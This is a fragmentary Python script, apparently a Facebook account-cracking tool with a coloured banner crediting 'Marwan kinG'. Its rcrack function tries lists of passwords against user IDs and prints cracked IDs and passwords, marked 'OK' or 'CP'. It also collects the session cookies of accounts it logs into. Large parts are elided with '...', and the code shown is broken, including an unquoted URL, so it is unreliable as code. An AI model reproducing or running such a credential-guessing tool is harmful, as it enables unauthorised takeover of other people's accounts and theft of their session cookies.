...
\033[1;93m______________________________________________________
 ...
 \033[1;93m(*)\033[1;92m Developer : Marwan kinG
 \033[1;93m(*)\033[1;92m WhatsApp  : 0318*******
 \033[1;93m(*)\033[1;92m Version   : 2.0
 \033[1;93m(*)\033[1;92m Github    : https://www.facebook.com/profile.php?id=100057281774018
\033[1;93m______________________________________________________
"""    
loop = 0
oks = []
...
def rcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			free_fb = session.get(https://www.facebook.com/profile.php?id=100057281774018).text
			log_data = {
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('     \033[1;32m[Marwan -OK] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('     \033[1;33m[Marwan -CP] '+cid+' | '+ps+'\033[0;97m')
